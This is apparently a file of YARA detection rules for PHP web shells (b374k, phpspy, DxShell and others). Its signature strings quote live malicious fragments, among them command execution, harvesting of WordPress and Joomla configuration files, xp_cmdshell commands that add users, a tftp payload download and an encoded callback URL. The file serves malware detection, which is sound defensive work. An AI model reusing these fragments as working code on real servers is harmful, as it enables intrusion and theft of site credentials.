      $s8 = "{if(function_exists(exec)){$nval=exec($ocmd);}elseif(!function_exists(exec)){$nval=shell_exec($ocmd);}" fullword ascii
      $s9 = "if ($_REQUEST['uscmnds']=='op3'){callfuncs('cat /var/cpanel/accounting.log');}" fullword ascii
      $s10 = "ob_start();passthru($ocmd);$nval=ob_get_contents();ob_clean();}" fullword ascii
      $s11 = "print $sf.\"<textarea cols=157 rows=23 name=edittxt>\"; $alltxt= file_get_contents($_REQUEST['edit']);" fullword ascii
      $s12 = "print \" - <a href=\".inclink('dlink', 'cmdhlp').\"&scdir=$nscdir>Cmd Yard" fullword ascii
      $s13 = "if (!isset($_REQUEST['rfile'])&&isset($_REQUEST['cmd'])){print \"<div><b><center>[ Executed command ][$] : \".$_REQUEST['cmd']." ascii
      $s14 = "if (!isset($_REQUEST['rfile'])&&isset($_REQUEST['cmd'])){print \"<div><b><center>[ Executed command ][$] : \".$_REQUEST['cmd']." ascii
      $s15 = "\\$sock = IO::Socket::INET->new(PeerAddr => \\\"old.zone-h.org\\\", PeerPort => 80, Proto => \\\"tcp\\\") or next;" fullword ascii
      $s16 = "ob_start();passthru($cmnd);$pret = ob_get_contents();ob_clean();" fullword ascii
      $s17 = "\\$sys= 'echo \\\"[ Operating system ][$]\\\"; echo \\\"`uname -a`\\\";" fullword ascii
      $s18 = "<option value='op3'>/var/cpanel/accounting.log</option>" fullword ascii
      $s19 = "fclose($zrodlo);echo \"<center><pre>\".$sta.htmlspecialchars($tekst).$eta.\"</pre></center>\";unlink($temp);} else {" fullword ascii
      $s20 = "elseif(!function_exists(shell_exec)){$opop=popen($ocmd,'r');" fullword ascii
   condition:
      uint16(0) == 0xbbef and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule sig_5b9824d1b6de1963106fcabcbd08b1f87a29de30
{
   meta:
      description = "php17 - file 5b9824d1b6de1963106fcabcbd08b1f87a29de30.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4cb2f9e72641a594228669c0e2eb2188cc32fb13ae6708f3d2d39c620a76c8a9"
   strings:
      $x1 = "formhead(array('title'=>'Execute Command', 'onsubmit'=>'g(\\'shell\\',null,this.p1.value);return false;'));" fullword ascii
      $x2 = "<a href=\"javascript:g('shell',null,'','','','','<?php echo $charset;?>');\">Execute Command</a> | " fullword ascii
      $x3 = "2013 final</a>. Copyright (C) 2004-2013 <a href=\"http://www.4ngel.net\" target=\"_blank\">[S4T]</a> All Rights Reserved." fullword ascii
      $x4 = "p('<p><a href=\"http://w'.'ww.4'.'ng'.'el.net/php'.'sp'.'y/pl'.'ugin/\" target=\"_blank\">Get plugins</a></p>');" fullword ascii
      $x5 = "$res = execute(which('perl').\" /tmp/angel_bc \".$p2.\" \".$p3.\" &\");" fullword ascii
      $s6 = "echo '<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">';" fullword ascii
      $s7 = "$res = execute(\"/tmp/angel_bc \".$p2.\" \".$p3.\" &\");" fullword ascii
      $s8 = "<title><?php echo $act.' - '.$_SERVER['HTTP_HOST'];?></title>" fullword ascii
      $s9 = "p('<p class=\"red\">MySQL '.$DB->version().' running in '.$dbhost.' as '.$dbuser.'@'.$dbhost.'</p>');" fullword ascii
      $s10 = "p('<pre>'.execute($p1).'</pre>');" fullword ascii
      $s11 = "$attachsize = '<a href=\"javascript:g(\\'file\\', null, \\'getsize\\', \\''.$dirdb['filename'].'\\');\">Stat</a>';" fullword ascii
      $s12 = "m('Database has backup to <a href=\"'.$fileurl.'\" target=\"_blank\">'.$P['bak_path'].'</a>');" fullword ascii
      $s13 = "if( strpos( strtolower( $_SERVER['HTTP_USER_AGENT'] ), 'bot' ) !== false ) {" fullword ascii
      $s14 = "echo \"<p class=\\\"b\\\">Mysql error description: \".htmlspecialchars($this->geterrdesc()).\"</p>\\n\";" fullword ascii
      $s15 = "27 => array('Safe mode exec dir',getcfg('safe_mode_exec_dir'))," fullword ascii
      $s16 = "21 => array('upload_max_filesize',(getcfg('file_uploads') ? getcfg('upload_max_filesize') : 'Not allowed'))," fullword ascii
      $s17 = "formhead(array('title'=>'Eval PHP Code', 'onsubmit'=>'g(\\'eval\\',null,this.p1.value);return false;'));" fullword ascii
      $s18 = "<form onsubmit=\"g('file',this.cwd.value);return false;\" method=\"POST\" id=\"godir\" name=\"godir\">" fullword ascii
      $s19 = "<a href=\"javascript:g('portscan',null,'','','','','<?php echo $charset;?>');\">Port Scan</a> | " fullword ascii
      $s20 = "13 => array('Administrator',(isset($_SERVER['SERVER_ADMIN']) ? $_SERVER['SERVER_ADMIN'] : getcfg('sendmail_from')))," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

/* Super Rules ------------------------------------------------------------- */

rule _1n73ction_683f78842d7cf41a39744494a4bb787d6c6c4e91_0
{
   meta:
      description = "php17 - from files 1n73ction.php, 683f78842d7cf41a39744494a4bb787d6c6c4e91.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9af1a6e4122d7751016c5aee923352962427c48ec0924bf007aac751cdad7af1"
      hash2 = "f3d0d694f2dd8b78a947a5e00c28d023c0fcc291ac5e70f74a81780bd5abb3e1"
   strings:
      $x1 = "document.location = 'http://www.pharmconseil-elearning.com/main/upload/Sql_injection_dengan_hackbar.pdf';" fullword ascii
      $x2 = "$s_my_ip = gethostbyname($_SERVER['HTTP_HOST']);$rsport = \"443\";$rsportb4 = $rsport;$rstarget4 = $s_my_ip;$s_result = \"<br><b" ascii
      $x3 = "$x=@file_get_contents('http://www.bing.com/search?q=ip%3A' . $ip . '+index.php?option=com&first=' . $npage);" fullword ascii
      $x4 = "echo\"<td>Not Found</td><td><a href='http://www.google.com/#hl=en&q=download+$comxx+joomla+extension'>Download</a></td></tr>\";" fullword ascii
      $x5 = "<center><p>Tanks To <a href=\"https://www.facebook.com/anton115\" target=\"_blank\">Cah_bagus</a></p></b></center>" fullword ascii
      $x6 = "curl_setopt($ch, CURLOPT_POSTFIELDS,\"username=admin&passwd=123456789&option=com_login&task=login&\".$hidden.\"=1\");" fullword ascii
      $x7 = "echo \"<center/><br/><b><font color=#00ff00>-=[ Command  Bypass Exploit ]=-</font></b><br>" fullword ascii
      $x8 = "{echo \"<p>\".$host.\" => <font color='red'>Error In Login Page !</font></p>\";ob_flush();flush();continue;}" fullword ascii
      $x9 = "document.location = 'http://199.91.153.192/3t115p2f6gvg/zvrrddmq6icqtd2/Metasploit_Toolkit.pdf';" fullword ascii
      $x10 = "/* (Web Shell b374k r3c0d3d by x'1n73ct|default pass:\" 1n73ction \") */ " fullword ascii
      $x11 = "$f = fopen(\"Result.txt\",\"a+\"); fwrite($f , \"Success ~~ $user:$pass -> $site/administrator/index.php\\n\"); fclose($f); " fullword ascii
      $x12 = "symlink('/home6/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');" fullword ascii
      $x13 = "symlink('/home2/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');" fullword ascii
      $x14 = "symlink('/home5/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');" fullword ascii
      $x15 = "symlink('/home7/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');" fullword ascii
      $x16 = "symlink('/home4/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');" fullword ascii
      $x17 = "symlink('/home3/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');" fullword ascii
      $x18 = "symlink('/home7/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');" fullword ascii
      $x19 = "symlink('/home2/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');" fullword ascii
      $x20 = "symlink('/home4/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 1000KB and ( 1 of ($x*) )
      ) or ( all of them )
}

rule _01882513d5fa7c329e940dda99b12147_9e3bdcc1e97765618231caf0029d1ecc_1
{
   meta:
      description = "php17 - from files 01882513d5fa7c329e940dda99b12147.php, 9e3bdcc1e97765618231caf0029d1ecc.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a3679eb75f374afad1b58f2f600dfa18886a32eb482439da9d9750a819d4953c"
      hash2 = "6b509225a914a529691ff6d7c6254cbed8ce2192dad80443afdabba6ba464b86"
   strings:
      $s1 = "SVDVWS0Z1cEJhMmpsbU5FU3NYMW9abm81N2ZJRVVURUFhTzV5QlZnc0EwRUNXUHFaVlFrdllPeXNrQkE0" fullword ascii
      $s2 = "4cnU5T25nWXVhV1Irc0FxZWViQkRXbVZlRjZSOERrdlptOFpnV2UzZGdIY0xnWkczRXFGQXlIdmRJbVFF" fullword ascii
      $s3 = "SeDhJVjM0N2wyaDBTeksrZjloQUZlR3FpRHFUcUZjNG80ZlJkNlhZaGhLOGMxUWVIWHlQbDZiU3BPaDdH" fullword ascii
      $s4 = "iXDEzNyI7JHE3MzgwMjczLj0iXHg2ZiI7JGtiMzI4YzMwLj0iXDE0NiI7JHJlOGE1OWM3Lj0iXDE2MiI7" fullword ascii
      $s5 = "UeWp6ZTRWZWhvbUlzSnJnbEJFY0dJY0M5a0ZXYTlEYmpzRm0wdXZnc1NxSko5VDllMml5Sm5BcmJJSEo0" fullword ascii
      $s6 = "LZVBQWXZEZG4wUjNUcXJHd0xadnRsZ2Vya2krYVpEVTFiY092ZTZyZ1JFSnJsVm9RbWVOWDlLdjU0c0Vy" fullword ascii
      $s7 = "yVVFjRHlqVk1Qa0xjbWZJNm0xTEF2MWhWT0hWZUxIUUZlOGxGdWRBMFdYejBxVGhEdHFYeXF2d0gvWHFu" fullword ascii
      $s8 = "mZzcyRjRTYmVleFIrczVyalpjTmxYMWRzZk1XK3NjcGgvazFGVjhzQXNzZ0lsSnpBUUNVWDlNbnNZZjRB" fullword ascii
      $s9 = "iXDE0MSI7JGtiMzI4YzMwLj0iXDE3MiI7JHplMGMxYmE1Lj0iXDE1MSI7JHJlOGE1OWM3Lj0iXDE2NCI7" fullword ascii
      $s10 = "0UGVOTjNjM3N5cm4zbEQwNk9QZS9uT3VOdllYUENCSWpvb0t6ZnhpWWF2TWtKTGoyZitVVlFGQUhaTU5n" fullword ascii
      $s11 = "1c01zQU9Bd0NkdWthTjNQdllvUTA4YnhlZ2xsZ3Q0RmpYS2J0M0pRYzdTTEJZSHVmZFJFcVk1eWxIZ3Z3" fullword ascii
      $s12 = "0a1dtQUFtZGEvSktxV3E2M1gyTHNjcmE5aTdReEVlOGQwdHdKcFFHSEh5UVVEY0RiblEwV0cvaURrajdu" fullword ascii
      $s13 = "PYkZwS1IrS2JxYkFSNjZsbkNMN0F0Y2JlR0Z6cVdmcmwwZ2pkazdJZEJBclpLOG5DcUcrdWhwQWpBWjFy" fullword ascii
      $s14 = "1ZUFXU0hFbVJvdDg3RzRzQ2ZVRVdoRmZ6cHp2RXQzQStXWlpxdEp0cUl6WUtZU1haN2swVGppUTlJbDF5" fullword ascii
      $s15 = "LU0x0M05nOHpXZzZsOHcvK2liaVdIeEVZVmIrdi9lb0pQdElKbFp0cUxISmNGVVhZR0o4Q0lRbzdnZ0FU" fullword ascii
      $s16 = "FWjNRQXlDejVKS3E0b1pYOHpwRnV3WGtkajVLdHAvVXo3KytUU3VhZjBsaWpHUXQ1eFZNM01mbzlmS24z" fullword ascii
      $s17 = "vTmRpT1VhdGQ3aVB0RXU3V2JGOWpHMS95eWhGYno3a2RUZFc2TEFEcytRS3lteXNHZ09JQ1pTSitrdmsv" fullword ascii
      $s18 = "DaVk1MWY2cGc2bkdOalJlNytTSUZFakZNV3luMERiRUNOSXhuV1ZXbi9aNlNFREdQN2p4NmdVWmxPVzEz" fullword ascii
      $s19 = "6MEFzbFF2R1J2NEVtQVJOeWEwMWlabmFFbHBma094TThrMlJGd2lRQTBWOTNScmd5eWloUUZJSXBBMVE4" fullword ascii
      $s20 = "rZ0FDQjdxS241QWYxUE1kVEF4ZHREaDM3b3Z2NTZ4bGNpY1VnZHJPS0V0Rk14eHppMGUyRWU3OVpsWTRQ" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 800KB and ( 8 of them )
      ) or ( all of them )
}

rule _28963af8abbe9f738531fa2fe0e9e8cb276d4061_809321821fbe401df552dd9043bd85fd491b597c_2
{
   meta:
      description = "php17 - from files 28963af8abbe9f738531fa2fe0e9e8cb276d4061.php, 809321821fbe401df552dd9043bd85fd491b597c.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8dbf7351bb49a0eda096338b394c2018bbc66efece0b9b4c37e0a85373835243"
      hash2 = "21c1f56c071851f53f1b27dfe85fed9bd7da3141a9d80f665be59d370f761b34"
   strings:
      $x1 = "else { echo 'Could not execute command using system(), shell_exec(), passthru(), exec() && popen().'; }" fullword ascii
      $x2 = "echo '<form action=\"\" method=\"post\" id=\"form\"><textarea cols=\"90\" rows=\"25\" style=\"overflow:auto;\" id=\"fileEdit\" n" ascii
      $x3 = "<form action=\"?action=CLI&amp;dir=',$SCDIR,'\" method=\"post\" style=\"display:inline;\">Execute command" fullword ascii
      $x4 = "<td><form action=\"http://authsecu.com/decrypter-dechiffrer-cracker-hash-md5/script-hash-md5.php\" method=\"post\" target=\"_bla" ascii
      $x5 = "<td><form action=\"http://authsecu.com/decrypter-dechiffrer-cracker-hash-md5/script-hash-md5.php\" method=\"post\" target=\"_bla" ascii
      $x6 = "| [<a href=\"http://www.stayinvisible.com/\" target=\"_blank\">" fullword ascii
      $x7 = "if (is_dir($_POST['dm'])) { echo '\\'',htmlspecialchars($_POST['dm']),'\\' - Directory Already exists.'; }" fullword ascii
      $s8 = "Remove the shell password? <input type=\"submit\" id=\"removep\" name=\"removep\" value=\"Remove\" />" fullword ascii
      $s9 = "if (function_exists('shell_exec')) { echo htmlspecialchars(shell_exec('type '.$_POST['value'])); $Suc = TRUE; }" fullword ascii
      $s10 = "else { echo 'Error while removing shell, Could not delete the file.';GetLastError(); }" fullword ascii
      $s11 = "<td><form action=\"http://md5decryption.com\" method=\"post\" target=\"_blank\" style=\"display:inline;\"><input type=\"hidden\"" ascii
      $s12 = "<td><form action=\"http://md5decryption.com\" method=\"post\" target=\"_blank\" style=\"display:inline;\"><input type=\"hidden\"" ascii
      $s13 = "<td><form action=\"http://www.md5decrypter.com/\" method=\"post\" target=\"_blank\" style=\"display:inline;\"><input type=\"hidd" ascii
      $s14 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC" ascii
      $s15 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC" ascii
      $s16 = "strpos($ShellContents,'$Auth = FALSE;'),14)) != 0) { echo 'Password set.'; }" fullword ascii
      $s17 = "blur=\"javascript: if(this.value === \\'\\') { this.value = \\'Target of the link\\'; }\" style=\"width:140px;\" />" fullword ascii
      $s18 = "echo 'Please enter the password: <input type=\"text\" id=\"pass\" name=\"pass\" /> <input type=\"submit\" value=\"Enter\" />" fullword ascii
      $s19 = "elseif (function_exists('shell_exec')) { echo shell_exec($_POST['c']); }" fullword ascii
      $s20 = "if ($_GET['action'] === 'getfile') { if (!readfile($_GET['file'])) { echo file_get_contents($_GET['file']); } die; }" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _34127df2be5061288e2863da49b977a4a025273f_5425e9f71fca02fd3ac7a3ffa8dbd254afec8213_55254f8f1d961c9a832cf2c3f7747b3e510efbdf_3
{
   meta:
      description = "php17 - from files 34127df2be5061288e2863da49b977a4a025273f.php, 5425e9f71fca02fd3ac7a3ffa8dbd254afec8213.php, 55254f8f1d961c9a832cf2c3f7747b3e510efbdf.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "43411e7e750ebfe589cc4004da7b67e907c6f2cfe868a00962ff6b08b515e4c2"
      hash2 = "0f7aad3e734d2a719d82358afda9ec240e8bd58999d0b76e75f3d5f4dda38985"
      hash3 = "80a13546c401bbf7495b74bfeb0d78d293dd5289b64b3af936cc00372daeacc2"
   strings:
      $x1 = "Str[17] = \"select shell('c:\\windows\\system32\\cmd.exe /c net user b4che10r abc123 /add');\";" fullword ascii
      $x2 = "Str[11] = \"Declare @s  int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /c echo ^<%ex" fullword ascii
      $x3 = "Str[23] = \"Declare @s  int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /c echo '<?ph" fullword ascii
      $x4 = "---> '.$ports[$i].'<br>'; ob_flush(); flush(); } } echo '</div>'; return true; } function shellcode_decode($Url_String,$Oday_val" ascii
      $x5 = "Str[23] = \"Declare @s  int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /c echo '<?php phpin" ascii
      $x6 = "t($_POST['cmdpath']) ? $_POST['cmdpath'] : 'c:\\\\windows\\\\system32\\\\cmd.exe'; print<<<END" fullword ascii
      $x7 = "if(!empty($_POST['cmd'])) { $exe = @$shell->exec(\"$cmdpath /c \".$cmd); $out = $exe->StdOut(); $output = $out->ReadAll(); echo " ascii
      $x8 = "Str[15] = \"tftp -i 219.134.46.245 get server.exe c:\\\\\\\\server.exe\";" fullword ascii
      $x9 = "';} } Root_Login($MSG_TOP); exit(); ob_end_flush(); } if(isset($_GET['s'])){$s = $_GET['s'];if($s != 'a' && $s != 'n')Root_CSS()" ascii
      $x10 = "== 'a' && isset($_POST['number'])){$Oday_value = $_POST['number'];$Shell_Code = shellcode_encode($_POST['code'],$Oday_value);} " fullword ascii
      $x11 = "','fso.createtextfile()'=>'fso.createtextfile(path,true)','<%execute(request())%>'=>'<%execute(request','<%eval request()%>'=>'<" ascii
      $x12 = "$getfile = isset($_POST['downfile']) ? $_POST['downfile'] : ''; $getaction = isset($_POST['getfile']) ? $_POST['getfile'] : ''; " ascii
      $x13 = "---> '.$ports[$i].'<br>'; ob_flush(); flush(); } } echo '</div>'; return true; } function shellcode_decode($Url_String,$Oday_va" fullword ascii
      $x14 = "$shell = new COM($com[$object]); if($object == 'wscript') { $cmd = isset($_POST['cmd']) ? $_POST['cmd'] : 'dir'; $cmdpath = isse" ascii
      $x15 = "'; $cmd = 'dir'; if(!empty($_POST['cmd'])){$res = Exec_Run($_POST['cmd']);$cmd = $_POST['cmd'];} print<<<END" fullword ascii
      $x16 = "'; $mhost = 'localhost'; $muser = 'root'; $mport = '3306'; $mpass = ''; $mdata = 'mysql'; $sqlcmd = 'ver'; if(isset($_POST['mhos" ascii
      $x17 = "= VBScript.Encode %>'=>'<%@ LANGUAGE = VBScript.Encode %>','www.rootkit.net.cn'=>'www.rootkit.net.cn','Process.GetProcesses'=>'" fullword ascii
      $x18 = "e($process); } } } } } function su() { $SUPass = isset($_POST['SUPass']) ? $_POST['SUPass'] : '#l@$ak#.lk;0@P'; print<<<END" fullword ascii
      $x19 = "Str[21] = \"Use master dbcc addextendedproc ('xp_cmdshell','xplog70.dll')\";" fullword ascii
      $x20 = "&') ? '<font style=font:11pt color=ff0000>execute command successfully</font>' : '<font style=font:11pt color=ff0000>execute co" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( 1 of ($x*) )
      ) or ( all of them )
}

rule _Andela_1C3_v3__Private_Release_2017__Andela_1C3_v3_Private_Release_2017_Andela_1C3_v3__Private_Release_2017__4
{
   meta:
      description = "php17 - from files Andela 1C3 v3 (Private Release 2017).php, Andela-1C3-v3-Private-Release-2017.php, Andela_1C3_v3__Private_Release_2017_.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7e9caebd44693228ae80bd64854630729e6ccf7faa86ad63033346527022ec83"
      hash2 = "a067ff53c2da0add29f0be2f0957f9fd8a673850cdec2747e8ccfe9676eeeb90"
      hash3 = "ba508230c8801587f56c0a049664a3bfb572780bf5e1d9e7f637e90df39dd817"
   strings:
      $x1 = "$andela = \"7L12attTsjD82Tkn/wHh+I7sK1sEN1a0LUK4E9xKQ3EyxweACGPFUxAkkMnz29+qxk9jk1VEmfvM814lslWgu7q6urqW7q7q9ypi8VDqgQr9jaYXC5oO" ascii
      $s2 = "$brow = urlencode($_SERVER['HTTP_USER_AGENT']);" fullword ascii
      $s3 = "echo @eval(@file_get_contents(@$_REQUEST[\"qwert\"]));" fullword ascii
      $s4 = "XX5yU8tdPsAuxAamXZorludZdfCuDnNzqA+CMou9Gp9piezVsAfcbce7xaE6YacjStysEXazke4lSwdeQKw95UulVTrLzn/PybnqMvc9VGATKMN9SPYQVg8u11IRcOOs" ascii
      $s5 = "echo \\'<b>Namesis<br><br>\\'.php_uname().\\'<br></b>\\';echo \\'<form action=\"\" method=\"post\" enctype=\"multipart/form-data" ascii
      $s6 = "7sd08o9sdpuSVc0dD02ZbF3iR31OtZVNtdenSetlIsoYTuspRUKs9qsv0UNuZuj1SY/7s82YyvcOth/Mz2hHwHHaMVBrvU86R/QsNfQV+p6EJ+dbVMfdUMpM7TcQUEq5" ascii
      $s7 = "d\"></form>\\';if( $_POST[\\'_upl\\'] == \"Upload\" ) {" fullword ascii
      $s8 = "wTm9/Nqn0GhKkXn334I1jpKFTUGzy9+1KWeZcbx8VGaq4mG6aiJU5IbnSThnVv4ZwM7qMmjCL8iDP7VJFAhX3Py0rn4Xw==\";" fullword ascii
      $s9 = "## change pass $auth_pass in this below  ##" fullword ascii
      $s10 = "$retValue = file_get_contents(base64_decode(\"aHR0cDovL3IwMHQuaW5mby9ib3QveWF6LnBocD9h\").\"=\".$lld.base64_decode(\"JmI=\").\"=" ascii
      $s11 = "$retValue = file_get_contents(base64_decode(\"aHR0cDovL3IwMHQuaW5mby9ib3QveWF6LnBocD9h\").\"=\".$lld.base64_decode(\"JmI=\").\"=" ascii
      $s12 = "qu8xQ+//I1h4H/gFANtnxeyek2zLwVsyduy+1kEMwCmuPSVZXi02zT8hKghPxEfojQ+Fh/uE44Jg5b1anRxHDNbfCBeViisWHdLgEww0cjUgmHqsrr84BSicdEp7rDDe" ascii
      $s13 = "$auth_pass = \"a3567437a39f1bcd3f1035f87adf98ea\";" fullword ascii
      $s14 = "yCUBZpBo1T44+LtWGqLrUJto+EZYZTvxw19zSn0gLLvr3lf/4YHyhLOEvYQ1wmX/bczdLL8jcwWRSXPvmqPogieUh7Koem384AXFf+7of+6Iyr4yTTF7cIaQQoYtsL/B" ascii
      $s15 = "$lls = $_SERVER[\"HTTP_HOST\"];" fullword ascii
      $s16 = "else { echo \\'<b>Upload Fail !!!</b><br><br>\\'; }}" fullword ascii
      $s17 = "r+apyuD3C80GFeasht8FVvHuac/VkvXZtPSj7QhYy29+9+JrPbhR8RZDaM5+6gdG2Puz4/vaHA+6/VJ/4yE7vVbefxzuBytdN10E986YsFCf0L+MvrL4tftpr7O+xfSX" ascii
      $s18 = "I7iv3oFbzjSCvtj5L+oYrLUSYmi4Uwkedh+Hv5cFAHPxX1yRnylZ3oSsGE9fTP8iRp+bszXDdcN1L9VT5rZ21XswloCxr4DffeinuAz75bXpKHs+YLeucvn3iGPaDDdT" ascii
      $s19 = "DG8ptfnJhALnGKdgetqw0mdUn1gDQi0AzFH4Z4FXE2Wnn/qn6NmDshXx/3zra8VvNN/5L3wXtooIg3LN5zdo05MADWjb/PNZ3C1GOBJ+zCDcGv1RMjCdbuvBQhAdIF1K" ascii
      $s20 = "UgBupBi9Qu5llO4XLNQiDNB2ZrJIpXX4hmV75NMXtXMhj3GZybtCKXeGvI9zGNLOh8wIrcv7R+lPGDpGctMJ70MQiXN0iPCOq0xerk9d0lFMEGtW7TMOEIjxdOXuzTDe" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 600KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _0e83217effdeb1f2e658bc2072c6f3c0_59f84f508d9d191b3517823a88663a7f615497bb_85f5db4b8f7e4d9a4991087250f96b0259c0e7e0_5
{
   meta:
      description = "php17 - from files 0e83217effdeb1f2e658bc2072c6f3c0.php, 59f84f508d9d191b3517823a88663a7f615497bb.php, 85f5db4b8f7e4d9a4991087250f96b0259c0e7e0.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6e7d3de77c94d4e08b613b4c121b1d7e940cfce690d81be4660013a7a35d673d"
      hash2 = "f89b2705177624cb31f1b5da12e25e03e4dfc22da1a3ba024d2690199291dccb"
      hash3 = "ab020357064518478b32f5297146d30e1ff9f5ea711de979d82bb8c22bcbbdc3"
   strings:
      $x1 = "$DEF_PORTS=array (1=>'tcpmux (TCP Port Service Multiplexer)',2=>'Management Utility',3=>'Compression Process',5=>'rje (Remote Jo" ascii
      $x2 = "$DxDOWNLOAD_File['content'].=\"\\n\\t\".'==== MySQL Dump '.DxDate(time()).' - DxShell v'.$GLOB['SHELL']['Ver'].' by o_O Tync';" fullword ascii
      $x3 = "foreach ($DUMP[0] as $key => $val) $DxDOWNLOAD_File['content'].=$key.\";\";" fullword ascii
      $x4 = "$DxDOWNLOAD_File['filename']='Dump_'.$_GET['dxsql_s'].'_'.$_GET['dxsql_d'].'.sql';" fullword ascii
      $x5 = "print \"\\n\\t\".'<input type=text name=\"DxFTP_FTP\" value=\"ftp.host.com[:21]\" style=\"width:100%;\">';" fullword ascii
      $x6 = "function DxExecNahuj($cmd, &$OUT, &$RET)" fullword ascii
      $x7 = "Url'])?$_POST['DxProx_Url']:'http://www.microsoft.com:80/index.php?get=q&get2=d').'\" style=\"width:100%;\"></td></tr>';" fullword ascii
      $x8 = "((@$_POST['DxS_Auth']['L']==$GLOB['SHELL']['USER']['Login']) AND" fullword ascii
      $x9 = "function DxHTTPMakeHeaders($method='', $URL='', $host='', $user_agent='', $referer='', $posts=array(), $cookie=array())" fullword ascii
      $x10 = "if (!ftp_login($FTP, $_POST['DxFTP_USER'], $_POST['DxFTP_PASS'])) die(DxError('Login failed'));" fullword ascii
      $x11 = "@$_COOKIE['DxS_AuthC']==md5($GLOB['SHELL']['USER']['Login'].$GLOB['SHELL']['USER']['Passw'])" fullword ascii
      $x12 = "$DxDOWNLOAD_File['headers'][]=('Content-type: text/plain');" fullword ascii
      $x13 = "$DxDOWNLOAD_File['headers'][]=('Content-disposition: attachment; filename=\"'.$DxDOWNLOAD_File['filename'].'\";');" fullword ascii
      $x14 = "host'])?$_POST['dxsock_host']:'www.microsoft.com') ).'\" style=\"width:100%;\">';" fullword ascii
      $x15 = "$DxDOWNLOAD_File['content'].=\"\\n\".'INSERT INTO `'.$CUR_TABLE.'` VALUES (\"'.implode('\", \"', $DUMP[$i]).'\");';" fullword ascii
      $x16 = "T['DxMailer_TO']))?'tristam@mail.ru'.\"\\n\".'billy@microsoft.com':$_POST['DxMailer_TO']  ).'</textarea></td></tr>';" fullword ascii
      $x17 = "$DxDOWNLOAD_File['headers'][]=('Content-disposition: attachment; filename=\"'.basename($_GET['dxfile']).'\";');" fullword ascii
      $s18 = "document.getElementById(\"LolBox\").value = contents + tl[index].substring(0,text_pos)+'|';" fullword ascii
      $s19 = "$DxDOWNLOAD_File['headers'][]=('Content-type: text/comma-separated-values');" fullword ascii
      $s20 = "r_FROM']))?'DxS <admin@'.$_SERVER['HTTP_HOST']:$_POST['DxMailer_FROM']  ).'>\" style=\"width:100%;\"></td></tr>';" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _013d407166ec4fa56eb1e1f8cbe183b9_499db4d70955f7d40cf5cbaf2ecaf7a2_6
{
   meta:
      description = "php17 - from files 013d407166ec4fa56eb1e1f8cbe183b9.php, 499db4d70955f7d40cf5cbaf2ecaf7a2.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "735f3b419096fe9b87f5e01da3da38d19d124127795fd868d037d709e3e2ff66"
      hash2 = "aca3248eeb6defd5eac482b0c4a3216456af50c24d93be57224ec1c02f33099a"
   strings:
      $x1 = "http://www.myserver.com/b374k.php?s_pass=fb621f5060b9f65acf8eb4232e3024140dea2b34&cmd=dW5hbWUgLWE=" fullword ascii
      $x2 = "// https://github.com/ded/domready - domready (c) Dustin Diaz" fullword ascii
      $x3 = "if(!in_array($s_k, $persist)) if(!is_array($s_k)) setcookie($s_k,\"\",time() - $s_login_time);" fullword ascii
      $x4 = "$s_rsbind[\"bind_win\"] = \"Bind Shell <span class='desc' style='font-size:12px;'>- windows executable</span>\";" fullword ascii
      $x5 = "http://www.myserver.com/b374k.php?s_pass=fb621f5060b9f65acf8eb4232e3024140dea2b34&eval=cGhwaW5mbygpOw==" fullword ascii
      $x6 = "elseif($s_sql['type']=='sqlite' || $s_sql['type']=='sqlite3') $s_dump_tbl = \"SELECT * FROM \".$s_tables.\" LIMIT 0,100\";" fullword ascii
      $x7 = "elseif($s_sql['type']=='oracle') $s_dump_tbl = \"SELECT * FROM \".$s_rows.\".\".$s_tables.\" WHERE ROWNUM BETWEEN 0 AND 100;\";" fullword ascii
      $s8 = "<?php if(isset($_GP['login'])) echo \"if(d.getElementById('login')) d.getElementById('login').focus();\"; ?>" fullword ascii
